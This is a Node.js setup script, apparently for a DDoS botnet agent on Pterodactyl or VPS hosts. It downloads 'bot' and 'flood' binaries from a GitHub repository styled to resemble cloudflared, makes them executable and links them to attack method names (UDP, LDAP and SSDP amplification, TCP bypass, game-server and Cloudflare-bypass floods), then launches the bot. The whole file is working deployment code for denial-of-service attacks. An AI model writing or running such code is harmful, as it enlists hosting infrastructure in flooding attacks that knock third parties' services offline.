/**
 * Bot Setup Script - Pure Node.js (Pterodactyl & VPS Compatible)
 * Downloads bot binary, flood binary, and agent.txt from GitHub repository
 * Creates method symlinks, sets executable permissions, and keeps process attached to container
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main';

const FILES_TO_DOWNLOAD = [
    { url: `${REPO_BASE}/bots/bot`, filename: 'bot', executable: true },
    { url: `${REPO_BASE}/bots/flood`, filename: 'flood', executable: true },
    { url: `${REPO_BASE}/bots/http`, filename: 'http', executable: true },
    { url: `${REPO_BASE}/bots/https`, filename: 'https', executable: true },
    { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt', executable: false }
];

const METHODS = [
    'dns', 'udp', 'ldap', 'ssdp', 'home', 'udpbypass',
    'tcp', 'socket', 'ovh', 'tcpmix', 'tcpbypass', 'ack',
    'game', 'rainbow', 'rocket', 'roblox', 'fivem', 'pubg', 'fortnite', 'warthunder', 'counter', 'samp',
    'subnet', 'icmp',
    'httpx', 'rapidflood', 'tls', 'tlsx', 'bypass', 'browser', 'cache', 'cloudflare'
];

function download(url, destPath) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return download(res.headers.location, destPath).then(resolve).catch(reject);
            }

            if (res.statusCode !== 200) {
                return reject(new Error(`Failed to download ${url}: HTTP status ${res.statusCode}`));
            }

            const fileStream = fs.createWriteStream(destPath);
            res.pipe(fileStream);

            fileStream.on('finish', () => {
                fileStream.close(resolve);
            });

            fileStream.on('error', (err) => {
                fs.unlink(destPath, () => {});
                reject(err);
            });
        }).on('error', (err) => {
            fs.unlink(destPath, () => {});
            reject(err);
        });
    });
}

function createMethodLinks(targetDir) {
    const floodPath = path.join(targetDir, 'flood');
    if (!fs.existsSync(floodPath)) return;

    console.log('[*] Setting up method symlinks...');
    for (const m of METHODS) {
        const linkPath = path.join(targetDir, m);
        try {
            if (fs.existsSync(linkPath)) fs.unlinkSync(linkPath);
            fs.symlinkSync('flood', linkPath);
        } catch (_) {
            try {
                fs.copyFileSync(floodPath, linkPath);
                fs.chmodSync(linkPath, 0o755);
            } catch (err) {
                console.error(`[!] Failed to link method ${m}: ${err.message}`);
            }
        }
    }
    console.log('[+] All method links ready.');
}

async function setup() {
    const targetDir = process.cwd();
    console.log(`[+] Setting up Bot in: ${targetDir}`);

    for (const item of FILES_TO_DOWNLOAD) {
        const dest = path.join(targetDir, item.filename);
        try {
            process.stdout.write(`[*] Downloading ${item.filename}... `);
            const nocacheUrl = `${item.url}?t=${Date.now()}`;
            await download(nocacheUrl, dest);
            console.log('OK');

            if (item.executable) {
                fs.chmodSync(dest, 0o755);
                console.log(`[+] Set chmod +x for ${item.filename}`);
            }
        } catch (err) {
            console.log('FAILED');
            console.error(`[!] Error with ${item.filename}: ${err.message}`);
        }
    }

    createMethodLinks(targetDir);

    const botBinPath = path.join(targetDir, 'bot');
    if (fs.existsSync(botBinPath)) {
        console.log('[+] Launching Bot process (attached to container)...');
        const child = spawn(botBinPath, [], {
            cwd: targetDir,
            stdio: ['inherit', 'pipe', 'pipe']
        });

        child.stdout.on('data', (data) => {
            process.stdout.write(data);
        });

        child.stderr.on('data', (data) => {
            process.stderr.write(data);
        });

        child.on('error', (err) => {
            console.error(`[!] Failed to start bot process: ${err.message}`);
            process.exit(1);
        });

        child.on('exit', (code, signal) => {
            console.log(`[!] Bot process exited with code ${code} (signal: ${signal})`);
            process.exit(code || 0);
        });

        process.on('SIGINT', () => child.kill('SIGINT'));
        process.on('SIGTERM', () => child.kill('SIGTERM'));
    } else {
        console.error('[-] Bot binary not found, execution skipped.');
        process.exit(1);
    }
}

setup().catch((err) => {
    console.error(`[!] Setup failed: ${err.message}`);
    process.exit(1);
});
